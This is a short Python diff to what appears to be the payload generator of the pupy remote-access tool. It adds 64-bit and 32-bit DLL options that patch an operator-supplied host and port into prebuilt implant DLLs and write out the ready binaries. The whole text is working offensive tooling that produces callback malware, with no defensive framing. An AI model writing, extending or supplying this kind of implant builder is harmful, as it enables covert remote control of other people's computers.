@@ -66,10 +66,19 @@ if __name__=="__main__":
 		with open(outpath, 'wb') as w:
 			w.write(binary)
 	elif args.type=="dll_x64":
-		exit("not implemented")
+		binary=get_edit_binary(os.path.join("payloads","pupyx64.dll"), args.host, args.port)
+		outpath="pupyx64.dll"
+		if args.output:
+			outpath=args.output
+		with open(outpath, 'wb') as w:
+			w.write(binary)
 	elif args.type=="dll_x86":
-		exit("not implemented")
-		pass
+		binary=get_edit_binary(os.path.join("payloads","pupyx86.dll"), args.host, args.port)
+		outpath="pupyx86.dll"
+		if args.output:
+			outpath=args.output
+		with open(outpath, 'wb') as w:
+			w.write(binary)
 	else:
 		exit("Type %s is invalid."%(args.type))
 	print "binary generated to %s with HOST=%s"%(outpath,(args.host, args.port))
